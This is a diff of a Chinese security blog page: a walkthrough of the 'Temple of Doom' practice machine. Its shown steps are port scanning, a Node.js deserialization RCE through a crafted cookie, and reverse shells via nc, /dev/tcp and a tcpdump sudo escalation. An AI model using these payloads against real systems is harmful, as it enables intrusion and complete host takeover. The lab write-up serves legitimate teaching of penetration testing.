@@ -22,6 +22,7 @@
     var CONFIG = {"hostname":"evilarsene.icu","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
+
   <meta name="description" content="Temple of Doomkali:192.168.1.201目标:192.168.1.229">
 <meta property="og:type" content="article">
 <meta property="og:title" content="靶场Temple of Doom">
@@ -29,11 +30,26 @@
 <meta property="og:site_name" content="Love ❤ Hacking">
 <meta property="og:description" content="Temple of Doomkali:192.168.1.201目标:192.168.1.229">
 <meta property="og:locale">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/2.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/3.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/4.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/5.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/6.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/7.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/9.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/13.png">
+<meta property="og:image" content="http://evilarsene.icu/images/TempleofDoom/14.png">
 <meta property="article:published_time" content="2020-09-15T06:36:52.000Z">
-<meta property="article:modified_time" content="2020-09-15T13:36:17.081Z">
+<meta property="article:modified_time" content="2020-11-29T08:52:50.816Z">
 <meta property="article:author" content="EvilArsene">
 <meta property="article:tag" content="Linux靶机">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://evilarsene.icu/images/TempleofDoom/1.png">
 
 <link rel="canonical" href="http://evilarsene.icu/2020/09/15/%E9%9D%B6%E5%9C%BATemple-of-Doom/">
 
@@ -215,10 +231,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-09-15 14:36:52 / 修改时间：21:36:17" itemprop="dateCreated datePublished" datetime="2020-09-15T14:36:52+08:00">2020-09-15</time>
+              <time title="创建时间：2020-09-15 14:36:52" itemprop="dateCreated datePublished" datetime="2020-09-15T14:36:52+08:00">2020-09-15</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-29 16:52:50" itemprop="dateModified" datetime="2020-11-29T16:52:50+08:00">2020-11-29</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -243,19 +265,19 @@
         <h1 id="Temple-of-Doom"><a href="#Temple-of-Doom" class="headerlink" title="Temple of Doom"></a>Temple of Doom</h1><p>kali:192.168.1.201<br>目标:192.168.1.229</p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.229 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.229 -oN nmap</span><br></pre></td></tr></table></figure>
 
-<p>![1](/images/Temple of Doom/1.png)</p>
+<p><img src="/images/TempleofDoom/1.png" alt="1"></p>
 <p>发现http端口666，并且使用了Node.js</p>
 <h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>dirbuster枚举，什么都没发现</p>
 <p>但在主页有一些发现</p>
 <p>第一次访问</p>
-<p>![2](/images/Temple of Doom/2.png)</p>
+<p><img src="/images/TempleofDoom/2.png" alt="2"></p>
 <p>之后再次访问</p>
-<p>![3](/images/Temple of Doom/3.png)</p>
+<p><img src="/images/TempleofDoom/3.png" alt="3"></p>
 <p>发现后端使用JSON，比较两次请求的差异</p>
 <p>主要是第一次请求后，它给我设置了一个cookie，第二次请求携带了这段cookie</p>
-<p>![4](/images/Temple of Doom/4.png)</p>
+<p><img src="/images/TempleofDoom/4.png" alt="4"></p>
 <p>末尾看到%3D，这是一个常见的URL编码(等号)，我们先进行URL解码，再base64</p>
-<p>![5](/images/Temple of Doom/5.png)</p>
+<p><img src="/images/TempleofDoom/5.png" alt="5"></p>
 <p>一段序列化数据</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;Admin&quot;,&quot;csrftoken&quot;:&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l&#x3D;&quot;,&quot;Expires&#x3D;&quot;:Friday, 13 Oct 2018 00:00:00 GMT&quot;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -263,35 +285,35 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;Admin&quot;,&quot;csrftoken&quot;:&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l&#x3D;&quot;,&quot;Expires&#x3D;&quot;:&quot;Friday, 13 Oct 2018 00:00:00 GMT&quot;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>修复后，进行base64编码，再URL编码给发送过去</p>
-<p>![6](/images/Temple of Doom/6.png)</p>
+<p><img src="/images/TempleofDoom/6.png" alt="6"></p>
 <p>看来是个Node.js的unserialize漏洞</p>
 <h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>谷歌搜索Node.js 反序列化漏洞，你就可以找到很多的PoC</p>
 <p>ls-l</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function()&#123;return require(&#39;child_process&#39;).execSync(&#39;ls -l &#x2F;&#39;,(e,out,err)&#x3D;&gt;&#123;console.log(out);&#125;); &#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>对其base64，再URL编码发送过去</p>
-<p>![7](/images/Temple of Doom/7.png)</p>
+<p><img src="/images/TempleofDoom/7.png" alt="7"></p>
 <p>whoami</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function()&#123;return require(&#39;child_process&#39;).execSync(&#39;whoami&#39;,(e,out,err)&#x3D;&gt;&#123;console.log(out);&#125;); &#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>![8](/images/Temple of Doom/8.png)</p>
+<p><img src="/images/TempleofDoom/8.png" alt="8"></p>
 <p>成功获得了RCE<br>直接反弹shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function()&#123;return require(&#39;child_process&#39;).execSync(&#39;rm -rf &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f | nc 192.168.1.201 443 1&gt;&#x2F;tmp&#x2F;f&#39;,(e,out,err)&#x3D;&gt;&#123;console.log(out);&#125;); &#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>![9](/images/Temple of Doom/9.png)</p>
+<p><img src="/images/TempleofDoom/9.png" alt="9"></p>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权有点小隐蔽</p>
-<p>![10](/images/Temple of Doom/10.png)</p>
+<p><img src="/images/TempleofDoom/10.png" alt="10"></p>
 <p>可以发现fireman在运行ss-manager，这是一个不可描述的软件，俗称小飞机</p>
-<p>![11](/images/Temple of Doom/11.png)</p>
+<p><img src="/images/TempleofDoom/11.png" alt="11"></p>
 <p>我们可以找到它也会受到json注入攻击，payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -u 127.0.0.1 8839</span><br><span class="line">add: &#123;&quot;server_port&quot;:8003, &quot;password&quot;:&quot;test&quot;, &quot;method&quot;:&quot;||&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;4444  0&gt;&amp;1||&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>![12](/images/Temple of Doom/12.png)</p>
+<p><img src="/images/TempleofDoom/12.png" alt="12"></p>
 <p>接下来的提权就很显眼了</p>
-<p>![13](/images/Temple of Doom/13.png)</p>
+<p><img src="/images/TempleofDoom/13.png" alt="13"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;nc -nv 192.168.1.201 8080 -e &#x2F;bin&#x2F;bash&#39; &gt; evil</span><br><span class="line">sudo tcpdump -ln -i eth0 -w &#x2F;dev&#x2F;null -W 1 -G 1 -z &#x2F;tmp&#x2F;evil -Z root</span><br></pre></td></tr></table></figure>
 
-<p>![14](/images/Temple of Doom/14.png)</p>
+<p><img src="/images/TempleofDoom/14.png" alt="14"></p>
 
     </div>
 
@@ -391,7 +413,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">130</span>
+          <span class="site-state-item-count">131</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -439,7 +461,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
